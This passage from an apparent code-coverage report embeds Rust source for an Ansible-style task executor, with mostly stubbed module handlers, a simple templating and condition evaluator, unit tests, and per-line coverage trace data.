Ok(TaskResult::changed().with_msg(format!(\"Templated {} to {}\", src, dest)))\n    }\n\n    async fn execute_package(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let name = args.get(\"name\").ok_or_else(|| {\n            ExecutorError::RuntimeError(\"package module requires 'name' argument\".into())\n        })?;\n\n        let state = args\n            .get(\"state\")\n            .and_then(|v| v.as_str())\n            .unwrap_or(\"present\");\n\n        if ctx.check_mode {\n            return Ok(TaskResult::ok().with_msg(format!(\n                \"Check mode - would ensure package {:?} is {}\",\n                name, state\n            )));\n        }\n\n        debug!(\"Would ensure package {:?} is {}\", name, state);\n        Ok(TaskResult::changed().with_msg(format!(\"Package {:?} state: {}\", name, state)))\n    }\n\n    async fn execute_service(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let name = args.get(\"name\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"service module requires 'name' argument\".into())\n        })?;\n\n        let state = args.get(\"state\").and_then(|v| v.as_str());\n        let enabled = args.get(\"enabled\").and_then(|v| v.as_bool());\n\n        if ctx.check_mode {\n            return Ok(\n                TaskResult::ok().with_msg(format!(\"Check mode - would manage service {}\", name))\n            );\n        }\n\n        debug!(\n            \"Would manage service: {} (state: {:?}, enabled: {:?})\",\n            name, state, enabled\n        );\n        Ok(TaskResult::changed().with_msg(format!(\"Service {} managed\", name)))\n    }\n\n    async fn execute_user(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let name = args.get(\"name\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"user module requires 'name' argument\".into())\n        })?;\n\n        if ctx.check_mode {\n            return Ok(\n                TaskResult::ok().with_msg(format!(\"Check mode - would manage user {}\", name))\n            );\n        }\n\n        debug!(\"Would manage user: {}\", name);\n        Ok(TaskResult::changed().with_msg(format!(\"User {} managed\", name)))\n    }\n\n    async fn execute_group(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let name = args.get(\"name\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"group module requires 'name' argument\".into())\n        })?;\n\n        if ctx.check_mode {\n            return Ok(\n                TaskResult::ok().with_msg(format!(\"Check mode - would manage group {}\", name))\n            );\n        }\n\n        debug!(\"Would manage group: {}\", name);\n        Ok(TaskResult::changed().with_msg(format!(\"Group {} managed\", name)))\n    }\n\n    async fn execute_lineinfile(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let path = args.get(\"path\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"lineinfile requires 'path' argument\".into())\n        })?;\n\n        if ctx.check_mode {\n            return Ok(TaskResult::ok().with_msg(format!(\"Check mode - would modify {}\", path)));\n        }\n\n        debug!(\"Would modify line in: {}\", path);\n        Ok(TaskResult::changed().with_msg(format!(\"Modified {}\", path)))\n    }\n\n    async fn execute_blockinfile(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let path = args.get(\"path\").and_then(|v| v.as_str()).ok_or_else(|| {\n            ExecutorError::RuntimeError(\"blockinfile requires 'path' argument\".into())\n        })?;\n\n        if ctx.check_mode {\n            return Ok(\n                TaskResult::ok().with_msg(format!(\"Check mode - would modify block in {}\", path))\n            );\n        }\n\n        debug!(\"Would modify block in: {}\", path);\n        Ok(TaskResult::changed().with_msg(format!(\"Modified block in {}\", path)))\n    }\n\n    async fn execute_stat(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        _ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let path = args\n            .get(\"path\")\n            .and_then(|v| v.as_str())\n            .ok_or_else(|| ExecutorError::RuntimeError(\"stat requires 'path' argument\".into()))?;\n\n        debug!(\"Would stat: {}\", path);\n\n        // Return simulated stat result\n        let stat_result = serde_json::json!({\n            \"exists\": true,\n            \"path\": path,\n            \"isdir\": false,\n            \"isreg\": true,\n            \"mode\": \"0644\",\n            \"uid\": 1000,\n            \"gid\": 1000,\n            \"size\": 1024,\n        });\n\n        Ok(TaskResult::ok().with_result(serde_json::json!({ \"stat\": stat_result })))\n    }\n\n    async fn execute_fail(\u0026self, args: \u0026IndexMap\u003cString, JsonValue\u003e) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let msg = args\n            .get(\"msg\")\n            .and_then(|v| v.as_str())\n            .unwrap_or(\"Failed as requested\");\n\n        Ok(TaskResult::failed(msg))\n    }\n\n    async fn execute_assert(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n        runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let that = args\n            .get(\"that\")\n            .ok_or_else(|| ExecutorError::RuntimeError(\"assert requires 'that' argument\".into()))?;\n\n        let conditions: Vec\u003c\u0026str\u003e = match that {\n            JsonValue::String(s) =\u003e vec![s.as_str()],\n            JsonValue::Array(arr) =\u003e arr.iter().filter_map(|v| v.as_str()).collect(),\n            _ =\u003e {\n                return Err(ExecutorError::RuntimeError(\n                    \"assert 'that' must be string or array\".into(),\n                ))\n            }\n        };\n\n        for condition in conditions {\n            let result = self.evaluate_condition(condition, ctx, runtime).await?;\n            if !result {\n                let fail_msg = args\n                    .get(\"fail_msg\")\n                    .or_else(|| args.get(\"msg\"))\n                    .and_then(|v| v.as_str())\n                    .unwrap_or(\"Assertion failed\");\n\n                return Ok(TaskResult::failed(format!(\"{}: {}\", fail_msg, condition)));\n            }\n        }\n\n        let success_msg = args\n            .get(\"success_msg\")\n            .and_then(|v| v.as_str())\n            .unwrap_or(\"All assertions passed\");\n\n        Ok(TaskResult::ok().with_msg(success_msg))\n    }\n\n    async fn execute_pause(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let seconds = args.get(\"seconds\").and_then(|v| v.as_u64()).unwrap_or(0);\n\n        if seconds \u003e 0 {\n            debug!(\"Pausing for {} seconds\", seconds);\n            tokio::time::sleep(tokio::time::Duration::from_secs(seconds)).await;\n        }\n\n        Ok(TaskResult::ok().with_msg(format!(\"Paused for {} seconds\", seconds)))\n    }\n\n    async fn execute_wait_for(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let host = args\n            .get(\"host\")\n            .and_then(|v| v.as_str())\n            .unwrap_or(\u0026ctx.host);\n        let port = args.get(\"port\").and_then(|v| v.as_u64());\n        let timeout = args.get(\"timeout\").and_then(|v| v.as_u64()).unwrap_or(300);\n\n        if let Some(p) = port {\n            debug!(\"Would wait for {}:{} (timeout: {}s)\", host, p, timeout);\n        }\n\n        Ok(TaskResult::ok().with_msg(\"Wait condition met\"))\n    }\n\n    async fn execute_include_vars(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        _runtime: \u0026Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let file = args\n            .get(\"file\")\n            .or_else(|| args.get(\"_raw_params\"))\n            .and_then(|v| v.as_str())\n            .ok_or_else(|| ExecutorError::RuntimeError(\"include_vars requires file path\".into()))?;\n\n        debug!(\"Would include vars from: {}\", file);\n\n        // In real implementation, would load and parse the file\n        // For now, just acknowledge\n        Ok(TaskResult::ok().with_msg(format!(\"Included vars from {}\", file)))\n    }\n\n    async fn execute_include_tasks(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let file = args\n            .get(\"file\")\n            .or_else(|| args.get(\"_raw_params\"))\n            .and_then(|v| v.as_str())\n            .ok_or_else(|| {\n                ExecutorError::RuntimeError(\"include_tasks requires file path\".into())\n            })?;\n\n        debug!(\"Would include tasks from: {}\", file);\n\n        // In real implementation, would load and execute tasks\n        Ok(TaskResult::ok().with_msg(format!(\"Included tasks from {}\", file)))\n    }\n\n    async fn execute_meta(\u0026self, args: \u0026IndexMap\u003cString, JsonValue\u003e) -\u003e ExecutorResult\u003cTaskResult\u003e {\n        let action = args\n            .get(\"_raw_params\")\n            .or_else(|| args.get(\"action\"))\n            .and_then(|v| v.as_str())\n            .unwrap_or(\"noop\");\n\n        match action {\n            \"flush_handlers\" =\u003e {\n                debug!(\"Would flush handlers\");\n                Ok(TaskResult::ok().with_msg(\"Handlers flushed\"))\n            }\n            \"refresh_inventory\" =\u003e {\n                debug!(\"Would refresh inventory\");\n                Ok(TaskResult::ok().with_msg(\"Inventory refreshed\"))\n            }\n            \"noop\" =\u003e Ok(TaskResult::ok()),\n            \"end_play\" =\u003e Ok(TaskResult::ok().with_msg(\"Play ended\")),\n            \"end_host\" =\u003e Ok(TaskResult::ok().with_msg(\"Host ended\")),\n            \"clear_facts\" =\u003e {\n                debug!(\"Would clear facts\");\n                Ok(TaskResult::ok().with_msg(\"Facts cleared\"))\n            }\n            \"clear_host_errors\" =\u003e Ok(TaskResult::ok().with_msg(\"Host errors cleared\")),\n            _ =\u003e {\n                warn!(\"Unknown meta action: {}\", action);\n                Ok(TaskResult::ok())\n            }\n        }\n    }\n}\n\n/// Template a value using variables\nfn template_value(\n    value: \u0026JsonValue,\n    vars: \u0026IndexMap\u003cString, JsonValue\u003e,\n) -\u003e ExecutorResult\u003cJsonValue\u003e {\n    match value {\n        JsonValue::String(s) =\u003e {\n            let templated = template_string(s, vars)?;\n            // Try to parse as JSON if it looks like a value\n            if let Ok(parsed) = serde_json::from_str::\u003cJsonValue\u003e(\u0026templated) {\n                if !matches!(parsed, JsonValue::Object(_)) {\n                    return Ok(parsed);\n                }\n            }\n            Ok(JsonValue::String(templated))\n        }\n        JsonValue::Array(arr) =\u003e {\n            let templated: Result\u003cVec\u003c_\u003e, _\u003e =\n                arr.iter().map(|v| template_value(v, vars)).collect();\n            Ok(JsonValue::Array(templated?))\n        }\n        JsonValue::Object(obj) =\u003e {\n            let mut result = serde_json::Map::new();\n            for (k, v) in obj {\n                let templated_key = template_string(k, vars)?;\n                let templated_value = template_value(v, vars)?;\n                result.insert(templated_key, templated_value);\n            }\n            Ok(JsonValue::Object(result))\n        }\n        _ =\u003e Ok(value.clone()),\n    }\n}\n\n/// Template a string using variables\nfn template_string(template: \u0026str, vars: \u0026IndexMap\u003cString, JsonValue\u003e) -\u003e ExecutorResult\u003cString\u003e {\n    // Simple Jinja2-like templating\n    // Handle {{ variable }} syntax\n    let mut result = template.to_string();\n\n    // Find all {{ ... }} patterns\n    let re = regex::Regex::new(r\"\\{\\{\\s*([^}]+?)\\s*\\}\\}\").unwrap();\n\n    for cap in re.captures_iter(template) {\n        let full_match = cap.get(0).unwrap().as_str();\n        let expr = cap.get(1).unwrap().as_str().trim();\n\n        let value = evaluate_variable_expression(expr, vars)?;\n        let replacement = json_to_string(\u0026value);\n        result = result.replace(full_match, \u0026replacement);\n    }\n\n    Ok(result)\n}\n\n/// Evaluate a variable expression (e.g., \"foo.bar\" or \"foo['bar']\")\nfn evaluate_variable_expression(\n    expr: \u0026str,\n    vars: \u0026IndexMap\u003cString, JsonValue\u003e,\n) -\u003e ExecutorResult\u003cJsonValue\u003e {\n    // Handle simple variable lookup\n    let parts: Vec\u003c\u0026str\u003e = expr.split('.').collect();\n\n    if parts.is_empty() {\n        return Ok(JsonValue::Null);\n    }\n\n    // Get root variable\n    let root = parts[0].trim();\n    let mut value = vars.get(root).cloned().unwrap_or(JsonValue::Null);\n\n    // Navigate nested properties\n    for part in \u0026parts[1..] {\n        let key = part.trim();\n        value = match \u0026value {\n            JsonValue::Object(obj) =\u003e obj.get(key).cloned().unwrap_or(JsonValue::Null),\n            JsonValue::Array(arr) =\u003e {\n                if let Ok(idx) = key.parse::\u003cusize\u003e() {\n                    arr.get(idx).cloned().unwrap_or(JsonValue::Null)\n                } else {\n                    JsonValue::Null\n                }\n            }\n            _ =\u003e JsonValue::Null,\n        };\n    }\n\n    Ok(value)\n}\n\n/// Convert JSON value to string for templating\nfn json_to_string(value: \u0026JsonValue) -\u003e String {\n    match value {\n        JsonValue::Null =\u003e \"\".to_string(),\n        JsonValue::Bool(b) =\u003e b.to_string(),\n        JsonValue::Number(n) =\u003e n.to_string(),\n        JsonValue::String(s) =\u003e s.clone(),\n        _ =\u003e serde_json::to_string(value).unwrap_or_default(),\n    }\n}\n\n/// Evaluate a conditional expression\nfn evaluate_expression(expr: \u0026str, vars: \u0026IndexMap\u003cString, JsonValue\u003e) -\u003e ExecutorResult\u003cbool\u003e {\n    let expr = expr.trim();\n\n    // Handle simple boolean expressions\n    if expr == \"true\" || expr == \"True\" {\n        return Ok(true);\n    }\n    if expr == \"false\" || expr == \"False\" {\n        return Ok(false);\n    }\n\n    // Handle 'not' expressions\n    if let Some(inner) = expr.strip_prefix(\"not \") {\n        return Ok(!evaluate_expression(inner.trim(), vars)?);\n    }\n\n    // Handle 'and' expressions\n    if let Some(pos) = expr.find(\" and \") {\n        let left = \u0026expr[..pos];\n        let right = \u0026expr[pos + 5..];\n        return Ok(\n            evaluate_expression(left.trim(), vars)? \u0026\u0026 evaluate_expression(right.trim(), vars)?\n        );\n    }\n\n    // Handle 'or' expressions\n    if let Some(pos) = expr.find(\" or \") {\n        let left = \u0026expr[..pos];\n        let right = \u0026expr[pos + 4..];\n        return Ok(\n            evaluate_expression(left.trim(), vars)? || evaluate_expression(right.trim(), vars)?\n        );\n    }\n\n    // Handle comparison operators\n    if let Some(pos) = expr.find(\" == \") {\n        let left = evaluate_variable_expression(\u0026expr[..pos].trim(), vars)?;\n        let right_str = expr[pos + 4..].trim();\n        let right = parse_value(right_str, vars)?;\n        return Ok(left == right);\n    }\n\n    if let Some(pos) = expr.find(\" != \") {\n        let left = evaluate_variable_expression(\u0026expr[..pos].trim(), vars)?;\n        let right_str = expr[pos + 4..].trim();\n        let right = parse_value(right_str, vars)?;\n        return Ok(left != right);\n    }\n\n    if let Some(pos) = expr.find(\" is defined\") {\n        let var_name = expr[..pos].trim();\n        let value = evaluate_variable_expression(var_name, vars)?;\n        return Ok(!value.is_null());\n    }\n\n    if let Some(pos) = expr.find(\" is not defined\") {\n        let var_name = expr[..pos].trim();\n        let value = evaluate_variable_expression(var_name, vars)?;\n        return Ok(value.is_null());\n    }\n\n    if let Some(pos) = expr.find(\" in \") {\n        let left_str = expr[..pos].trim();\n        let right_str = expr[pos + 4..].trim();\n        let left = evaluate_variable_expression(left_str, vars)?;\n        let right = evaluate_variable_expression(right_str, vars)?;\n\n        return match right {\n            JsonValue::Array(arr) =\u003e Ok(arr.contains(\u0026left)),\n            JsonValue::String(s) =\u003e {\n                if let JsonValue::String(l) = left {\n                    Ok(s.contains(\u0026l))\n                } else {\n                    Ok(false)\n                }\n            }\n            _ =\u003e Ok(false),\n        };\n    }\n\n    // Handle variable truthiness\n    let value = evaluate_variable_expression(expr, vars)?;\n    Ok(is_truthy(\u0026value))\n}\n\n/// Parse a value from string (could be literal or variable)\nfn parse_value(s: \u0026str, vars: \u0026IndexMap\u003cString, JsonValue\u003e) -\u003e ExecutorResult\u003cJsonValue\u003e {\n    let s = s.trim();\n\n    // String literal\n    if (s.starts_with('\\'') \u0026\u0026 s.ends_with('\\'')) || (s.starts_with('\"') \u0026\u0026 s.ends_with('\"')) {\n        return Ok(JsonValue::String(s[1..s.len() - 1].to_string()));\n    }\n\n    // Boolean\n    if s == \"true\" || s == \"True\" {\n        return Ok(JsonValue::Bool(true));\n    }\n    if s == \"false\" || s == \"False\" {\n        return Ok(JsonValue::Bool(false));\n    }\n\n    // Number\n    if let Ok(n) = s.parse::\u003ci64\u003e() {\n        return Ok(JsonValue::Number(n.into()));\n    }\n    if let Ok(n) = s.parse::\u003cf64\u003e() {\n        if let Some(num) = serde_json::Number::from_f64(n) {\n            return Ok(JsonValue::Number(num));\n        }\n    }\n\n    // Variable reference\n    evaluate_variable_expression(s, vars)\n}\n\n/// Check if a JSON value is \"truthy\"\nfn is_truthy(value: \u0026JsonValue) -\u003e bool {\n    match value {\n        JsonValue::Null =\u003e false,\n        JsonValue::Bool(b) =\u003e *b,\n        JsonValue::Number(n) =\u003e n.as_f64().map(|f| f != 0.0).unwrap_or(false),\n        JsonValue::String(s) =\u003e !s.is_empty() \u0026\u0026 s != \"false\" \u0026\u0026 s != \"False\" \u0026\u0026 s != \"no\",\n        JsonValue::Array(arr) =\u003e !arr.is_empty(),\n        JsonValue::Object(obj) =\u003e !obj.is_empty(),\n    }\n}\n\n/// Module trait for implementing custom modules\n#[async_trait]\npub trait Module: Send + Sync {\n    /// Module name\n    fn name(\u0026self) -\u003e \u0026str;\n\n    /// Execute the module\n    async fn execute(\n        \u0026self,\n        args: \u0026IndexMap\u003cString, JsonValue\u003e,\n        ctx: \u0026ExecutionContext,\n    ) -\u003e ExecutorResult\u003cTaskResult\u003e;\n\n    /// Validate arguments\n    fn validate_args(\u0026self, _args: \u0026IndexMap\u003cString, JsonValue\u003e) -\u003e ExecutorResult\u003c()\u003e {\n        Ok(())\n    }\n\n    /// Check if module supports check mode\n    fn supports_check_mode(\u0026self) -\u003e bool {\n        true\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_task_builder() {\n        let task = Task::new(\"Install nginx\", \"package\")\n            .arg(\"name\", \"nginx\")\n            .arg(\"state\", \"present\")\n            .when(\"ansible_os_family == 'Debian'\")\n            .notify(\"restart nginx\")\n            .register(\"install_result\");\n\n        assert_eq!(task.name, \"Install nginx\");\n        assert_eq!(task.module, \"package\");\n        assert_eq!(\n            task.args.get(\"name\"),\n            Some(\u0026JsonValue::String(\"nginx\".into()))\n        );\n        assert_eq!(task.when, Some(\"ansible_os_family == 'Debian'\".to_string()));\n        assert!(task.notify.contains(\u0026\"restart nginx\".to_string()));\n        assert_eq!(task.register, Some(\"install_result\".to_string()));\n    }\n\n    #[test]\n    fn test_template_string() {\n        let mut vars = IndexMap::new();\n        vars.insert(\"name\".to_string(), JsonValue::String(\"world\".to_string()));\n        vars.insert(\"count\".to_string(), JsonValue::Number(42.into()));\n\n        let result = template_string(\"Hello {{ name }}!\", \u0026vars).unwrap();\n        assert_eq!(result, \"Hello world!\");\n\n        let result = template_string(\"Count: {{ count }}\", \u0026vars).unwrap();\n        assert_eq!(result, \"Count: 42\");\n    }\n\n    #[test]\n    fn test_evaluate_expression_boolean() {\n        let vars = IndexMap::new();\n\n        assert!(evaluate_expression(\"true\", \u0026vars).unwrap());\n        assert!(!evaluate_expression(\"false\", \u0026vars).unwrap());\n        assert!(!evaluate_expression(\"not true\", \u0026vars).unwrap());\n    }\n\n    #[test]\n    fn test_evaluate_expression_comparison() {\n        let mut vars = IndexMap::new();\n        vars.insert(\"os\".to_string(), JsonValue::String(\"Debian\".to_string()));\n        vars.insert(\"count\".to_string(), JsonValue::Number(5.into()));\n\n        assert!(evaluate_expression(\"os == 'Debian'\", \u0026vars).unwrap());\n        assert!(!evaluate_expression(\"os == 'RedHat'\", \u0026vars).unwrap());\n        assert!(evaluate_expression(\"os != 'RedHat'\", \u0026vars).unwrap());\n    }\n\n    #[test]\n    fn test_evaluate_expression_defined() {\n        let mut vars = IndexMap::new();\n        vars.insert(\n            \"existing\".to_string(),\n            JsonValue::String(\"value\".to_string()),\n        );\n\n        assert!(evaluate_expression(\"existing is defined\", \u0026vars).unwrap());\n        assert!(!evaluate_expression(\"nonexistent is defined\", \u0026vars).unwrap());\n        assert!(evaluate_expression(\"nonexistent is not defined\", \u0026vars).unwrap());\n    }\n\n    #[test]\n    fn test_evaluate_expression_in() {\n        let mut vars = IndexMap::new();\n        vars.insert(\"items\".to_string(), serde_json::json!([\"a\", \"b\", \"c\"]));\n        vars.insert(\"letter\".to_string(), JsonValue::String(\"b\".to_string()));\n\n        assert!(evaluate_expression(\"letter in items\", \u0026vars).unwrap());\n    }\n\n    #[test]\n    fn test_task_result() {\n        let result = TaskResult::ok();\n        assert_eq!(result.status, TaskStatus::Ok);\n        assert!(!result.changed);\n\n        let result = TaskResult::changed();\n        assert_eq!(result.status, TaskStatus::Changed);\n        assert!(result.changed);\n\n        let result = TaskResult::failed(\"error message\");\n        assert_eq!(result.status, TaskStatus::Failed);\n        assert_eq!(result.msg, Some(\"error message\".to_string()));\n    }\n\n    #[test]\n    fn test_is_truthy() {\n        assert!(!is_truthy(\u0026JsonValue::Null));\n        assert!(!is_truthy(\u0026JsonValue::Bool(false)));\n        assert!(is_truthy(\u0026JsonValue::Bool(true)));\n        assert!(!is_truthy(\u0026JsonValue::String(\"\".to_string())));\n        assert!(is_truthy(\u0026JsonValue::String(\"hello\".to_string())));\n        assert!(!is_truthy(\u0026JsonValue::Array(vec![])));\n        assert!(is_truthy(\u0026JsonValue::Array(vec![JsonValue::Null])));\n    }\n}\n","traces":[{"line":60,"address":[30424128],"length":1,"stats":{"Line":1}},{"line":69,"address":[30424304],"length":1,"stats":{"Line":1}},{"line":78,"address":[32051152,32051410,32050848,32051122,32051128],"length":1,"stats":{"Line":1}},{"line":82,"address":[32050880,32051168],"length":1,"stats":{"Line":1}},{"line":88,"address":[32051440,32051714,32051720,32051744,32052002],"length":1,"stats":{"Line":0}},{"line":92,"address":[32051760,32051472],"length":1,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[30423095,30422912],"length":1,"stats":{"Line":0}},{"line":109,"address":[30423030,30422939],"length":1,"stats":{"Line":0}},{"line":110,"address":[30423075],"length":1,"stats":{"Line":0}},{"line":114,"address":[32052032,32052294,32052545,32052320],"length":1,"stats":{"Line":0}},{"line":115,"address":[32052152,32052350,32052090,32052409],"length":1,"stats":{"Line":0}},{"line":116,"address":[32052271,32052525],"length":1,"stats":{"Line":0}},{"line":120,"address":[30424480,30424719],"length":1,"stats":{"Line":0}},{"line":121,"address":[30424510,30424667],"length":1,"stats":{"Line":0}},{"line":122,"address":[30424696],"length":1,"stats":{"Line":0}},{"line":126,"address":[30423120,30424039,30424095],"length":1,"stats":{"Line":0}},{"line":132,"address":[30423168],"length":1,"stats":{"Line":0}},{"line":133,"address":[30423210],"length":1,"stats":{"Line":0}},{"line":134,"address":[30423281],"length":1,"stats":{"Line":0}},{"line":136,"address":[30423311],"length":1,"stats":{"Line":0}},{"line":137,"address":[32050656,32050686],"length":1,"stats":{"Line":0}},{"line":138,"address":[30423423],"length":1,"stats":{"Line":0}},{"line":139,"address":[32050494,32050464],"length":1,"stats":{"Line":0}},{"line":140,"address":[30423585],"length":1,"stats":{"Line":0}},{"line":142,"address":[30423671],"length":1,"stats":{"Line":0}},{"line":224,"address":[30430576],"length":1,"stats":{"Line":1}},{"line":225,"address":[30430584],"length":1,"stats":{"Line":1}},{"line":229,"address":[30420807,30420929,30419840],"length":1,"stats":{"Line":1}},{"line":231,"address":[30419861],"length":1,"stats":{"Line":1}},{"line":232,"address":[30419871],"length":1,"stats":{"Line":1}},{"line":233,"address":[30419924],"length":1,"stats":{"Line":1}},{"line":235,"address":[30419987],"length":1,"stats":{"Line":1}},{"line":238,"address":[30420084],"length":1,"stats":{"Line":1}},{"line":244,"address":[30420165],"length":1,"stats":{"Line":1}},{"line":253,"address":[32129114,32129108,32128320],"length":1,"stats":{"Line":1}},{"line":255,"address":[32128378],"length":1,"stats":{"Line":1}},{"line":256,"address":[32128467],"length":1,"stats":{"Line":1}},{"line":262,"address":[32128287,32128307,32127904],"length":1,"stats":{"Line":1}},{"line":263,"address":[32127994,32128101,32128268],"length":1,"stats":{"Line":2}},{"line":264,"address":[32128245],"length":1,"stats":{"Line":1}},{"line":268,"address":[32129136,32129425],"length":1,"stats":{"Line":1}},{"line":269,"address":[32129256,32129194],"length":1,"stats":{"Line":2}},{"line":270,"address":[32129402],"length":1,"stats":{"Line":1}},{"line":274,"address":[32129620,32129456],"length":1,"stats":{"Line":1}},{"line":275,"address":[32129509,32129574],"length":1,"stats":{"Line":2}},{"line":276,"address":[32129600],"length":1,"stats":{"Line":1}},{"line":280,"address":[32140704,32140993],"length":1,"stats":{"Line":1}},{"line":281,"address":[32140762,32140824],"length":1,"stats":{"Line":2}},{"line":282,"address":[32140970],"length":1,"stats":{"Line":1}},{"line":286,"address":[30441040,30441216],"length":1,"stats":{"Line":0}},{"line":287,"address":[30441160,30441067],"length":1,"stats":{"Line":0}},{"line":288,"address":[30441196],"length":1,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":294,"address":[],"length":0,"stats":{"Line":0}},{"line":298,"address":[30439872],"length":1,"stats":{"Line":0}},{"line":299,"address":[30439895],"length":1,"stats":{"Line":0}},{"line":300,"address":[30439903],"length":1,"stats":{"Line":0}},{"line":305,"address":[30440976],"length":1,"stats":{"Line":0}},{"line":312,"address":[32132551,32131969,32132226],"length":1,"stats":{"Line":0}},{"line":315,"address":[32132824,32132499],"length":1,"stats":{"Line":0}},{"line":316,"address":[26010020],"length":1,"stats":{"Line":0}},{"line":317,"address":[32133470],"length":1,"stats":{"Line":0}},{"line":318,"address":[32133478,32133823],"length":1,"stats":{"Line":0}},{"line":319,"address":[32133786,32134088],"length":1,"stats":{"Line":0}},{"line":327,"address":[32132898,32134302],"length":1,"stats":{"Line":0}},{"line":328,"address":[32134324,32134529,32134948],"length":1,"stats":{"Line":0}},{"line":329,"address":[32134339,32134445],"length":1,"stats":{"Line":0}},{"line":330,"address":[26010042],"length":1,"stats":{"Line":0}},{"line":334,"address":[32134645,32132072,32134374,32135017,32135730],"length":1,"stats":{"Line":0}},{"line":337,"address":[26010086],"length":1,"stats":{"Line":0}},{"line":340,"address":[32137272,32136239,32136517,32132114,32136417],"length":1,"stats":{"Line":0}},{"line":343,"address":[32136934,32137636],"length":1,"stats":{"Line":0}},{"line":344,"address":[32137850,32137217,32137151,32137474,32137007,32137536,32137603],"length":1,"stats":{"Line":0}},{"line":345,"address":[32137571,32137316,32132135,32137506,32137250,32137202],"length":1,"stats":{"Line":0}},{"line":349,"address":[32137053,32137688],"length":1,"stats":{"Line":0}},{"line":350,"address":[32137821,32138792,32137737],"length":1,"stats":{"Line":0}},{"line":351,"address":[26010152],"length":1,"stats":{"Line":0}},{"line":352,"address":[32138139,32138202],"length":1,"stats":{"Line":0}},{"line":353,"address":[32138531,32138255],"length":1,"stats":{"Line":0}},{"line":358,"address":[32139022,32137649,32138887],"length":1,"stats":{"Line":0}},{"line":359,"address":[32139362,32139042],"length":1,"stats":{"Line":0}},{"line":360,"address":[32139896],"length":1,"stats":{"Line":0}},{"line":363,"address":[32139302,32139557],"length":1,"stats":{"Line":0}},{"line":364,"address":[32139803],"length":1,"stats":{"Line":0}},{"line":365,"address":[32139867],"length":1,"stats":{"Line":0}},{"line":369,"address":[32138901],"length":1,"stats":{"Line":0}},{"line":373,"address":[30439504],"length":1,"stats":{"Line":0}},{"line":381,"address":[32057736,32057446,32057231],"length":1,"stats":{"Line":0}},{"line":383,"address":[32057719],"length":1,"stats":{"Line":0}},{"line":384,"address":[32058067],"length":1,"stats":{"Line":0}},{"line":385,"address":[32058081],"length":1,"stats":{"Line":0}},{"line":387,"address":[32058088,32059259,32058292,32058201],"length":1,"stats":{"Line":0}},{"line":390,"address":[26289538],"length":1,"stats":{"Line":0}},{"line":391,"address":[32059821,32059917,32062090,32059884,32059987],"length":1,"stats":{"Line":0}},{"line":392,"address":[32060080,32061763],"length":1,"stats":{"Line":0}},{"line":393,"address":[32060095,32060161],"length":1,"stats":{"Line":0}},{"line":394,"address":[32061256,32060815,32060333,32061527,32061231,32060561,32061922,32060177,32060631,32060907,32060260,32060222,32061960,32060900,32061094,32061534,32061445],"length":1,"stats":{"Line":0}},{"line":397,"address":[32060866],"length":1,"stats":{"Line":0}},{"line":398,"address":[32061145,32061238],"length":1,"stats":{"Line":0}},{"line":399,"address":[32061496],"length":1,"stats":{"Line":0}},{"line":405,"address":[32058426,32057313,32061825,32058396],"length":1,"stats":{"Line":0}},{"line":407,"address":[32058814,32058868],"length":1,"stats":{"Line":0}},{"line":408,"address":[32058861],"length":1,"stats":{"Line":0}},{"line":410,"address":[32058917,32058824],"length":1,"stats":{"Line":0}},{"line":411,"address":[32059021],"length":1,"stats":{"Line":0}},{"line":412,"address":[32059028],"length":1,"stats":{"Line":0}},{"line":414,"address":[32059052],"length":1,"stats":{"Line":0}},{"line":419,"address":[32058931,32059218],"length":1,"stats":{"Line":0}},{"line":424,"address":[26289574],"length":1,"stats":{"Line":0}},{"line":425,"address":[32062461,32062524],"length":1,"stats":{"Line":0}},{"line":429,"address":[32062554,32062590],"length":1,"stats":{"Line":0}},{"line":430,"address":[32062606],"length":1,"stats":{"Line":0}},{"line":431,"address":[32062679,32062689,32062571],"length":1,